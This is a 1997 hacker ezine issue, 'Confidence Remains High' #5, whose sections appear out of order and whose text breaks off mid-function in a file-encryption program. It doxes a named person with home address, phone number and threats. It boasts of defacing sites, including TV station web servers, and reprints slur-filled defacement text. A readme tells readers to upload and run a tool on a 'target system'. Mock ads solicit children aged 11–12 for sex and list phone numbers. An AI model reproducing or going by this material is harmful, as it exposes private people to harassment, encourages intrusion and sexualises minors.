ways of NFS exploitation (thru the portmapper or nfsd bugs in SunOS),this
paper quickly covered the basics.Hope you enjoyed as much as I did!.


-:Suggested Reading:-

UNIX System Administration Handbook

Managing NFS/NIS  
O'Reilly Publications

RFC1094

Relevant manpages.                                                              

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  8. #hebrew : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Any hebrews that can translate this for me will get a prize...

[migada] äé äî÷åøä?
[migada] ñìéçä
[migada] îä ÷åøä?
*[msg] ñìéçä
[migada] îàéôä àúä?
[migada] áï ëîä?
[migada] àí æàú áú àæ ñìéçä
*[msg] ñìéçä
[migada] áú àå áï?
[migada] îàéôä àú àå àúä??
[migada] áï àå áú ëîä àú àå àúä?
*[msg] áï àå áú ëîä?
*[msg] áú àå áï?
[migada] åàú àå àúä?
[migada] îä àúä øåöä
[migada] ?
*[msg] ñìéçä
*[msg] åàú àå àúä?
*[msg] ??
[migada] àú
[migada] òëùéå
[migada] àú àå àúä?
[migada] îàéôä?
[migada] âéì?
*[msg] òëùéå
*[msg] îàéôä?
[migada] àðé îäâìéì äòìéåï
[migada] òëùéå àúä?
[migada] îàéôä àúä?
[migada] áï ëîä àúä?
*[msg] òëùéå
[migada] àå àú?
[migada] úâéã àúä éåãò ìëúåá òåã îùäå çåõ îòëùéå àå ñìéçä
[migada] ?
*[msg] òëùéå àúä?
*[msg] ??
[migada] àú
[migada] àðé áú
[migada] !!!!!!!!!!!!!!!!!!!!!
*[msg] ?
[migada] åàðé îàåã âàä áæä
*[msg] àå àú?
[migada] áï ëîä àúä ?
[migada] îàéôä àúä?
*[msg] îàéôä àúä?
[migada] àðé îäâìéì äòìéåï
[migada] åàúä?
*[msg] áï ëîä àúä?
*[msg] ??
[migada] àí àðé àâéã âí àúä úâéã?
*[msg] àðé îäâìéì äòìéåï
[migada] îàéôä áãéå÷?
*[msg] àðé îäâìéì äòìéåï
*[msg] ?
[migada] îàéôä áãéå÷?
[migada] îçåìúä?
[migada] î÷öøéï.
[migada] ?
[migada] îàéôä?
*[msg] àéôå áâìéì
*[msg] åàðé îäâìéì ðééø èåàìè
[migada] àúä âîåø
[migada] áéé
*[msg] îàéôä áãéå÷?
[migada] ãéé
[migada] àúä ðùîò
[migada] åàúä âí ëåúá
*[msg] [msg] îàéôä áãéå÷?
*[msg] [migada] ãéé
*[msg] [migada] àúä ðùîò
*[msg] ??
[migada] ëîå ùéëåø ùìà éåãò îäçééí ùìå
*[msg] ãéé
[migada] àå ùúúçéì ìëúåá áøöéðåú àå ùâîøðå ìãáø
[migada] îä àúä îçìéè?
*[msg] àúä ðùîò
*[msg] ??
[migada] áéé
*[msg] ëîå ùéëåø ùìà éåãò îäçééí ùìå
[migada] áéé
*[msg] ãéé
*[msg] do you speak english?
[migada] yes

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  9. Lord Somer : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Lord Somer is now on the top of our list, due to the following reasons...

 1) He thinks he has skills
 2) He does w4r3z

He will get 0wned, just like all the others (sIn, ELH etc. etc.)

On his elite internic whois, he has...

   Somer, Robert

   The Hacker's Layer
   Cincinnati, OH 45238
   815 334-9547              (815 isn't Cincinnati, it's Woodstock)
                             (that fone # is the fax machine for the
                              nethosting company he uses)

So, we used a process of simple deduction, and here is (we hope), Lord Somer's
d0x...
                               
Thomas J Somers

5737 Walkerton Dr,
Cincinnati, OH 45238-1842

(513) 451-4239


w3 4r3 c0m1n f0r j00 w4r3z k1dd13, ph34r.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ NEWS ]=====================[ .SECTION E. ]=======================[ NEWS ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. c0de : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

New people hit the scene, c0de, #c0de on EFnet, check out www.hacked.net
to see what they've hit, all iRC targets so far (but we beat them to
www.cyber-dragon.org), lamefuck VB k0der \\StOrM\\ of sIn is in their
little group, so I really wouldn't rate them very highly at all.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. Beyond HOPE : Some dude @wired.com
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

With security personnel up from the CIA hometown in Langley, Virginia,
mixing with hackers up from basements across the country, the
techno-bacchanal Beyond HOPE highlighted the further evolution of computer
jocks into the mainstream - and into money. Now that security concerns and
hacking have yielded a booming industry ("tiger teams" of contractual
crackers), it should come as no surprise that this rowdy, packet-sniffing
bunch has learned to capitalize on its true talent: working the network. 

"Five years ago, they were a fringe, the Net was this obscure thing used
to hack phone tech manuals," says security and cryptography expert Bruce
Schneier, who spoke at this weekend's conference, held in New York and
sponsored by the hacking mag 2600. "Now there are companies whose life
blood is the Net, like Yahoo, Amazon.... And hackers are being 'outed,'
getting hired for penetration testing or starting companies." 

The three-day conference, keynoted by MSNBC commentator Brock Meeks,
proved that hacking is not a lifestyle choice, but a community with its
own rock stars (L0PHT), renegades (Metro-card hacking Red Balaklava),
martyrs (Bernie S., Phiber Optik), and even patron saints (Cheshire
Catalyst, Captain Crunch). 

While Steve Rambam walked the audience through the method for acquiring
a fake Social Security card, the media-savvy Mudge, wearing a
"Microshit" T-shirt, filled the group in on Theo de Raadt's OpenBSD, a
hacker-written operating system. With an exploit script, an easy-to-use
interface, and good name, "it will get press," said L0PHT member Mudge.
"Microsoft hates that, and that's why we love it." 

But the real attraction was the bank of Unix terminals prepped for public
consumption - and corruption. And while the hacker movement is gaining
force, it's also gaining speed. This year, the conference boasted an
operational 10 Mbps local network, compared to the crawling 28.8 Kbps
they had in 1994. "If you have a machine on the network, expect to be
hacked," said 2600 founder and conference organizer Emmanuel Goldstein,
"because that's what we're here for."

The 1,000-person strong Beyond HOPE is among a growing number of hacker
conferences, including Black Hat and DEFCON, both held in July in Las
Vegas. The happy-camper HIP conference was held, perhaps unwisely,
simultaneously. HOPE attendee CyberJunkie hacked the HIP conference
homepage and riddled it with HOPE icons. 

Though there's clearly a greater handshaking between law enforcement and
the hacker community, Bernie S. knows well that the amity has a ways to go.
The co-organizer of the 2600 meeting, the boyish Bernie was sent to prison
in May 1995 by the Secret Service for publishing a list of the service's
communications frequencies, code names, and photos of agents in action
(and picking their noses). The case against him began to verge on the
absurd when agents confused the dental putty in his garage with plastic
explosive. As the cause celebre of the culture, Bernie S. typifies the
resiliency of the group. "If you try to squelch info, it won't get
better," he said. "It'll mushroom."

Though most hackers subsist off freeware, the conference offered multiple
opportunities for conspicuous consumption. "Major Hacking" cookies were on
sale at the "Buy Our Shit" concession stand. A letter-bomb detector went for
US$40 (used), and another table offered "I Love Your Computer" bumper
stickers and "Co-Ed Naked Hacking" T-shirts ("Finger Me for More Info").
For the more serious consumer, Nadir sold hot hard drives and CD-ROM drives
for $50 a pop. Will he guarantee it works? "I'll guarantee I brought it
here," he answers. He's a student, and it's the first time he's tried
selling hijacked equipment, he says. "I just want to make people happy."

Ritalin junkies may have dominated by far, but the elder statesmen of the
movement were there in force. Phone phreak Cheshire Catalyst, the founder
of 2600 precursor TAP (Technical Assistance Program), started his newsletter
in 1971 for "pay-phone justice" - basically a primer on how to make phone
calls on a penny. Captain Crunch, a more grizzled veteran who served time,
reminisced about the time he prank-called Nixon in the White House.
("Sir, we have a crisis," he recalls saying. "What is the nature of the
crisis?" Nixon asked. "Sir, we're out of toilet paper," Crunch answered,
and hung up).

But for those on the outside, the line between allegiance and antagonism
isn't always clear. MSNBC commentator Brock Meeks called for hackers to
"pump up the volume," and bemoaned the loss of elegant hacks like the
hole-sniffing Satan or Hacker X's coup stripping the CyberPromotions
server and posting it all over news groups. 

"Twenty percent of government computers have been subject to hacking
attempts - that's a pretty low percentage." he said. "Get off your asses
and make that go up." 

Later, a black-clad attendee who requested anonymity scoffed at Meeks'
coaching. "It's so self-serving," he said. "He just wants to write about it." 

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  3. www.sinnerz.com gets 0wned : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

..this is what their new page looked like :


                         [FUCK1N 0WN3D SIN B1TCHEZ]

              sIn 4r3 n0w m3mb3rs 0f th3 c0d3z3r0 ph34r n4t10n.

------------------------------------------------------------------------------

                b0w the fuck d0wn j00 fuck1n' vB k0d3r punks.

     Team CodeZero, we got them madskills in effect, this time proving
  0wnersh1p over lamefuck vB k0derz, they deserve all this shit more than
  anyone, they think they're so fucking cool with their vB k0dez and their
                          k-r4d .txt ph1lez!@#~

------------------------------------------------------------------------------

               pHEAR dEM mADsKILLZ yOU fUCKING oWNED nIGGORS.

         wE bE dE oRIGINAL 4 mAN dREAM tEAM, wE rULE yOUR wEAK wORLD.

                            +-------------------+
                            Ý                   Ý
                            Ý                   Ý
                            Ý    retard.jpg     Ý
                            Ý                   Ý
                            Ý                   Ý
                            Ý                   Ý
                            Ý                   Ý
                            +-------------------+

                           so1o, xFli, helix, modeX

------------------------------------------------------------------------------

                        Team CodeZero, wh0 laughs last?
  

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ PROJECTS ]=================[ .SECTION F. ]===================[ PROJECTS ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. soltool for Solaris 2.5.x [sunOS 5.5.x] is here!@~ : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
=============================================================================
  The Solaris Security Tool Readme File :
=============================================================================

::: This tool is for use with Solaris 2.5.x [sunOS 5.5.x].
::: It needs /bin/bash on the target system to run.

To get soltool to work, do the following...

1) FTP it to your target system (the soltool.gz)
2) telnet in, and type...

% gunzip soltool.gz
% /bin/bash
$ chmod 755 soltool
$ soltool

... then it will run, and give you usages and stuff
... if it gives "Command not found" then try this as step 2...
    otherwise bash hasn't been installed.

% /usr/local/bash

Enjoy,

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. TOTAL CON : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

******************************************************************************
                         http://www.aom.co.uk/total/
******************************************************************************
  +------------------------------------+------------------------------------+
  Ý An Official Total Con Announcement Ý An Official Total Con Announcement Ý
  Ý An Official Total Con Announcement Ý An Official Total Con Announcement Ý
  +------------------------------------+------------------------------------+
******************************************************************************
                         http://www.aom.co.uk/total/
******************************************************************************

 Total Con '98 is now a reality, here are preliminary details...
 ===============================================================

 Venue        :  The Old Firestation, Silver Street, Brisol, ENGLAND
 Date         :  Late March 1998
 Duration     :  1 night (12:00pm -> 12:00pm next day)

 What         :  12 system network with internet access
                 Loud music
                 Fully licensed bar downstairs
                 Elite UV and spotlights
                 Channel 4 media coverage  (hopefully)

                 ALOT of cool people
                 ^^^^^^^^^^^^^^^^^^^
                 *** NO SPEAKERS WHATSOEVER ***


 Travel        : Easily accessible by car, train, bus or plane.
 Accomodation  : You can crash out in the Firestation (its HUGE) or book one
                 of many hotels in the immediate area.


******************************************************************************
                         http://www.aom.co.uk/total/
******************************************************************************
  +------------------------------------+------------------------------------+
  Ý An Official Total Con Announcement Ý An Official Total Con Announcement Ý
  Ý An Official Total Con Announcement Ý An Official Total Con Announcement Ý
  +------------------------------------+------------------------------------+
******************************************************************************
                         http://www.aom.co.uk/total/
******************************************************************************

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ FIN ]======================[ .SECTION G. ]========================[ FIN ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
--------------------------------------+---------------------------------------
                                      |
           YOUR SPECIAL AD            |            LET'S BE FREE
                                      |
       COULD BE RIGHT HERE #@!        |    Gay White Male 38, 5'11" looking
                                      |    for men, 12 - 32 clean, fit, and
       SEND ELECTRONIC MAIL TO:       |    hairy. Discreet Encounters.
           ADZ@CODEZ.COM              |    Call Anytime : (816)781-8009
                                      |                   (Ask for Tommy)
                                      |
--------------------------------------+---------------------------------------
                                      |
        ARE YOU 11 OR 12 ???          |      FREE FONESEX! CALL ME NOW!@
                                      |
 Looking for men 11 - 12 for adult    |    Yeah huney, you know you want me,
 video satisfaction. I am 35 into     |    I'll treat you just right, I'm
 Professional wrestling.              |    waiting for your call today!
 Let's talk soon : (816)453-8722      |    CALL ME NOW!@# : (847)546-9154
                                      |                     (Ask for Kim)
--------------------------------------+---------------------------------------
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                            .oO The CodeZero Oo.
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                      _   /|  k0dek4t sez...
                      \'o O'                            
                      =(_o_)=   "EyEm HuNGaRy FoR SKiLLz,
                        U               nOt CaTf00d!!#@"


ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
          Remember, McDonalds Owns You, And Ronald Is The KinG!!!
         Wendy Is Satan!! Don't Believe The Lies!! PHEAR WENDY!@#*
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
                             .oO The CodeZero Oo.
                             .oO   Presents   Oo.
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

 Welcome to issue 5 of..

       /IIIIIIIIII          /IIIIIIIIII           /III   /III
       \ III_____/          \ III___/III          \ III  \ III
        \ III                \ III  \ III          \ III  \_III
         \ III  onfidence     \ IIIIIIII  emains    \ IIIIIIIIII  igh
          \ III                \ III__/III           \ III__/ III
           \ III                \ III  \ III          \ III  \ III
            \ IIIIIIIIII   ___   \ III  \ III   ___    \ III  \ III   ___
             \_________/  /\__\   \__/   \__/  /\__\    \__/   \__/  /\__\
                          \/__/                \/__/                 \/__/

                                                         ...23rd October 1997
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                  Team CodeZero, we rule your weak network.

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

                   .-----------[ An Official ]-----------.
                   :      .-----.  .----.   .--.--.      :
                   :      :  .--'  : .-. :  :  :  :      :
                   !_-::  :  :     : `-' ;  :  .  :  ::-_!
                   :~-::  :: :     :: . :   ::    :  ::-~:
                   :      ::.`--.  ::.:  :  ::.:  :      :
                   :      `-----'  `--'--'  `--'--'      :
                   !_-::                             ::-_!
                   :~-::-[ Confidence Remains High ]-::-~:
                   :~-::                             ::-~:
                   `-----------[ Production ]------------'

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  In This "2500 lined (count 'em -- so1o)" Issue :
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

 -----=>  Section A  :  Introduction And Cover Story.

 1. Confidence Remains High issue 5....................: Tetsu Khan
 2. 0wning TV stations is cool.........................: so1o

 -----=>  Section B  :  Exploits And Code.

 1. Gerbil.c...........................................: TFreak (mods by Shok)
 2. Replaceit.sh.......................................: Shok / so1o
 3. Security.sh........................................: Berkeley
 4. Wozzeck.sh.........................................: Dave M.
 5. Chattr tekneeq.....................................: xFli

 -----=>  Section C  :  Phones / Scanning / Radio.

 1. 617 dialups........................................: zer0x
 2. FM radio bugs......................................: xFli

 -----=>  Section D  :  Miscellaneous.

 1. AT&T and Intel assembly syntax.....................: Shok
 2. sIn inf0z..........................................: so1o
 3. Wassup with NT?!...................................: Crystalize
 4. More #hebrew.......................................: so1o
 5. Linking to /dev/zero...............................: xFli
 6. Creating a crypto-worm (philosophy)................: Shok

 -----=>  Section E  :  World News (nothings happened this month)

 ------=> Section F  :  Projects.

 1. TOTALCON '98...................................: so1o
 2. Security / Monitoring tools....................: Shok
 3. PornBot........................................: TFreak

 -----=> Section G  :  The End. (+ Personal Column)

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ INTRO ]====================[ .SECTION A. ]======================[ INTRO ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. Confidence Remains High issue 5 : Tetsu Khan
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

Yet another issue of Confidence Remains High! Only 15 more to go until the
1/1/00..In this crh005.zip we have included TFreak's pornbot, johan's awaited
sirc4 code, and xFli's FM transmitter schematics, we all hope you enjoy reading
this issue of Confidence Remains High, I definately think its our best issue
yet..Distro sites are messed up, I'm gonna have to get our new permenant
domain as soon as I can. Until issue 6, enjoy!

The distro list..
=================

   www.technotronic.com                             /ezines/crh/
   ftp.linuxwarez.com                               /pub/crh/

ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  2. 0wning TV stations is cool : so1o
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

As you may well know, we took control of 2 television stations web servers in
the Fort ... area, some of my friends live in the immediate area, and the hack
was on the morning news, it was cool, we were on TV!@#~

It is currently on videotape, we will be getting it into an .avi or .mpg asap,
then you can phear our elite tv tekneeq, until then, here's an acsii
representation of the sites exploited (also check out www.hacked.net) :

------------------------------------------------------------------------------
                     [ wE oWN yOUR aIRWAVES!!!@~#~!~@ ]
------------------------------------------------------------------------------

                 [ w3lc0m3 t0 th3 c0d3z3r0 ph34r n4t10n!@# ]

------------------------------------------------------------------------------
         You know the deal, we 0wn your sites, make you look stupid,
        you try to catch us, but you don't know who, or where we are,
     we are just ghosts, ghosts your machines, you should learn to phear.
------------------------------------------------------------------------------

                        And tonight on CodeZero tV...
                        -----------------------------

                        An Introduction To RealDoll

                       Bill Gates Exclusive Interview

                      Why Not Websearch For "codezero" ?

------------------------------------------------------------------------------

            0wned (0'wn3d) The act of showing how fucking dumb a
                           sysadmin can be. See sekurity.
   
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
===============================================================================
==[ EXPLOITS ]=================[ .SECTION B. ]===================[ EXPLOITS ]==
===============================================================================
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
  1. Gerbil.c : TFreak (modified by Shok)
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

/*
 *  gerbil.c by TFreak [1.1 - 08/06/1997]
 *  This is an encryption program....
 *
 *  Few modifications by Shok.....
 *  Modified by Shok to allow you to output the encrypted file to a
 *  different file other than the original (this original version by
 *  TFreak overwrote the file)
 *
 */

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>
#include <unistd.h>
#include <termios.h>

#define BSIZE 1024
#define ERROR -1

char *OutputFile;
void getkey (char *);
void setTerm (int); 
void sighandler (void);

void main (int argc, char **argv)
{
    int fd, fd1, i, len, cycle = 0;
    long filesize, oldoffset;
    char key[BSIZE], plain, enc;
        
    if (argc < 3) {
        fprintf(stderr, "usage: %s <input filename> <output filename>\n", argv[0]);
        exit(ERROR);
    } 
    
    OutputFile = argv[2];
    /*  open our file, grab errors */
    if ((fd = open(argv[1], O_RDONLY)) == ERROR) {
        perror("opening input file for reading");
        exit(ERROR);
    }
    
    if ((fd1 = open(argv[2], O_CREAT|O_WRONLY, S_IREAD|S_IWRITE)) == ERROR) {
       perror("opening output file for writing");
       exit(ERROR);
    }
  
    /* get our key that were going to be using */
    setTerm(0);
    getkey(&key[0]);
    setTerm(1);
    
    putchar('\n');
    printf("Encrypting %s to %s....\nPlease wait.\n", argv[1], argv[2]);

    /* ignore Ctrl-C after we got key */
    signal(SIGINT, (void *)sighandler);
    signal(SIGKILL, (void *)sighandler);

    /* get the size of the file we're working with */
    if ((filesize = lseek(fd, 0L, SEEK_END)) == ERROR) {
        perror("reading file");
        close(fd);
        exit(ERROR);
    }
    for (len = 0; len < strlen(key); len++) {
        oldoffset = lseek(fd, 0L, SEEK_SET);
        cycle = len;
        for (i = 0; i < filesize; i++, cycle++) {
            oldoffset = lseek(fd, 0, SEEK_CUR);
            if (read(fd, &plain, 1) == ERROR) {
                perror("reading file");
                close(fd);
                exit(ERROR);
            }
    	    if (key[cycle] == '\0') cycle = 0;
            enc = ~plain ^ key[cycle]; 
            lseek(fd1, oldoffset,  SEEK_SET);
            if (write(fd1, &enc, 1) == ERROR) {
                perror("writing to file");
                close(fd);
                exit(ERROR);
            } 
        }
    } 
    puts("");
}

void getkey (char *ptrkey)
{
    char key2[BSIZE/2], salt[3]; 

    /* set a timer so we dont loop forever */
    alarm(60);

    while (1) {
        printf("Key: ");
        fgets(ptrkey, BSIZE/2, stdin); 
        if (ptrkey[0] == '\n') continue;
        if (strlen(ptrkey) < 2) {
            fprintf(stderr, "\nKey must be at least 2 characters\n");
            continue;
        }
        printf("\nAgain: ");
        fgets(key2, BSIZE/2, stdin);
        if ((strcmp(ptrkey, key2)) == 0) break;
        else fprintf(stderr, "\nKeys do not match\n"); 
    }    
